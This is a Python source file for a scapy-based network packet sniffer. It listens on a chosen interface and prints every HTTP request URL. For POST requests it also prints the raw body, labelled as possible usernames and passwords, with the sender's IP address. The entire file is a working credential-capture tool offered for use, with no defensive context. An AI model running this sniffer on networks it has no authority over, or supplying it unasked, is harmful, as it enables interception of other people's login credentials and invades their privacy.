from scapy.all import *
from scapy.layers import http
import argparse


class PacketSniffer:

    def __init__(self):
        pass

    def get_arguments(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("-i", "--interface", dest="Iface", help="Enter the interface")
        options = parser.parse_args()
        if not options.Iface:
            print("[+] No interface specifies. Exiting")
            exit()
        return options

    def sniff(self, interface):
        sniff(iface=interface, store=False, prn=self.display)

    def get_url(self, packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

    def get_login_info(self, packet):
        if packet.haslayer(Raw) and packet[http.HTTPRequest].Method.decode() == "POST":
            load = packet[Raw].load.decode()
            return load

    def display(self, packet):
        if packet.haslayer(http.HTTPRequest):
            url = self.get_url(packet).decode()
            if url:
                print(packet[IP].src, " ", end="")
            print("[+] HTTP request ->"+url)
            cred = self.get_login_info(packet)
            if cred:
                print(packet[IP].src, " ", end="")
                print("[+] Possible Username/Password ->" + cred)


obj = PacketSniffer()
options = obj.get_arguments()
interface = options.Iface
obj.sniff(interface)
